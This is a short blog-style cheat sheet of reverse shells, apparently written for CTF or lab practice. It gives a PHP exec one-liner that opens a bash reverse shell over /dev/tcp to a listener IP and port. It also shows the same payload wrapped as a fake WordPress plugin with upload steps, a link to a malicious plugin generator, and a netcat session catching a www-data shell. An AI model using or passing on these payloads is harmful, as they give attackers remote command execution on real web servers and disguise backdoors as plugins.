---
title: "Reverse shells"
excerpt: "a little list of reverse shells"
---

(a work in progress list of some handy reverse shells)

## Opening

### PHP

A generic PHP reverse shell where you can/should swap out the listening IP address and port:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.224/8080 0>&1'");
?>
```
{: file='~/naughty.php'}

### WordPress

For a WordPress plugin, you need to add a bit more info for it to load as a "valid" plugin as outlined in the [plugin development docs](https://developer.wordpress.org/plugins/plugin-basics/header-requirements/).

```php
<?php
/**
* Plugin Name: reverse shell plugin
* Description: opens a reverse shell with bash
* Version: 0.1
* Author: some-natalie
* Author URI: https://some-natalie.dev
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.224/8080 0>&1'");
?>
```
{: file='~/naughty-wp-plugin.php'}

Zip that PHP file, then upload the zipped file as a plugin.

> This lovely [malicious WordPress plugin](https://github.com/wetw0rk/malicious-wordpress-plugin) generator works well on some versions of WordPress and not others.  The boring one above works a bit more uniformally, but is nowhere near as full of features.
{: .prompt-info}

---

## Catching

### netcat

```shell-session
ᐅ nc -l 8080
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@8b8f280a8848:/var/www/html/wp-admin$ cat /tmp/flag
cat /tmp/flag
flag{a sneaky flag has appeared}
```
